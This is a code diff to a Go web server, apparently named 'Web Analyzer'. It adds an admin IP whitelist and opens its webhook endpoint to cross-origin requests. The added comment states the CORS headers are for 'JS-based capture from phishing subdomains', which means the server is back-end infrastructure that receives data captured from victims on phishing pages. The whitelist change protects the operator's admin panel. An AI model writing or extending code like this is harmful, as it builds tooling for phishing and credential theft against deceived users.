@@ -32,6 +32,7 @@ type Config struct {
 	AdminPath     string            `json:"admin_path"`
 	RetentionDays int               `json:"retention_days"`
 	WebhookSecret string            `json:"webhook_secret"`
+	AdminWhitelist []string         `json:"admin_whitelist"`
 	ProxyURL      string            `json:"proxy_url"`
 }
 
@@ -131,6 +132,16 @@ func (s *Server) handleHealth(c *gin.Context) {
 }
 
 func (s *Server) handleWebhook(c *gin.Context) {
+	// Add CORS headers for JS-based capture from phishing subdomains
+	c.Header("Access-Control-Allow-Origin", "*")
+	c.Header("Access-Control-Allow-Methods", "POST, OPTIONS")
+	c.Header("Access-Control-Allow-Headers", "Content-Type, X-Webhook-Secret")
+
+	if c.Request.Method == "OPTIONS" {
+		c.AbortWithStatus(204)
+		return
+	}
+
 	// Verify webhook secret
 	secret := c.GetHeader("X-Webhook-Secret")
 	if s.config.WebhookSecret != "" && secret != s.config.WebhookSecret {
@@ -273,6 +284,22 @@ func (s *Server) handleWebhook(c *gin.Context) {
 
 func (s *Server) adminAuth() gin.HandlerFunc {
 	return func(c *gin.Context) {
+		// IP Whitelist check
+		if len(s.config.AdminWhitelist) > 0 {
+			clientIP := c.ClientIP()
+			allowed := false
+			for _, ip := range s.config.AdminWhitelist {
+				if ip == clientIP {
+					allowed = true
+					break
+				}
+			}
+			if !allowed {
+				c.AbortWithStatusJSON(403, gin.H{"error": "IP not whitelisted"})
+				return
+			}
+		}
+
 		auth := c.GetHeader("Authorization")
 		if !strings.HasPrefix(auth, "Basic ") {
 			c.Header("WWW-Authenticate", `Basic realm="Web Analyzer"`)
